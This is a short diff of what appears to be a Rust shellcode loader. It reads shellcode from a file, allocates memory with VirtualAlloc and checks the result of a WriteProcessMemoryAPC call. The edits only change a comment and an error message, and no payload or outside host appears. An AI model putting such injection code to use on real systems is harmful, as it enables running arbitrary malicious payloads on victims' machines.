@@ -120,7 +120,7 @@ fn main() {
     let shellcode = read_shellcode(&args[1]).expect("Failed to read shellcode.");
 
     unsafe {
-        let size = (shellcode.len() + 0xFFF) & !0xFFF; // Align to page size
+        let size = (shellcode.len() + 0xFFF) & !0xFFF; // align to page size
         let mem_addr = VirtualAlloc(
             Some(ptr::null_mut()),
             size,
@@ -144,7 +144,7 @@ fn main() {
         );
 
         if status != 0 {
-            println!("[-] WriteProcessMemoryAPC failed with NTSTATUS: {:#x}", status);
+            println!("WriteProcessMemoryAPC failed with NTSTATUS: {:#x}", status);
             exit(1);
         }
 
